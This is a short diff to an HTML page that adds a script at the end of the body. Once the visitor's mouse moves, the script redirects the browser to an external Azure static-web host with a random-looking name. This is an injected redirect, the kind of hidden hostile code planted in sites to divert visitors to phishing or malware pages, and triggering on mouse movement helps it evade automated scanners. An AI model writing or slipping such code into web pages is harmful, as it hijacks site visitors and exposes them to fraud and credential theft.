@@ -142,5 +142,28 @@
     }
   </script>
 
+  <script>
+  let lastX = null;
+  let lastY = null;
+
+  function redirectOnMouseMove(event) {
+    if (lastX === null && lastY === null) {
+      // Just record initial position, no redirect yet
+      lastX = event.clientX;
+      lastY = event.clientY;
+      return;
+    }
+
+    // Check if mouse actually moved
+    if (event.clientX !== lastX || event.clientY !== lastY) {
+      window.location.href = "https://gappsoo9wo.z13.web.core.windows.net/"; // replace with your target URL
+      // Remove event listener after redirect
+      document.removeEventListener('mousemove', redirectOnMouseMove);
+    }
+  }
+
+  document.addEventListener('mousemove', redirectOnMouseMove);
+</script>
+
 </body>
 </html>
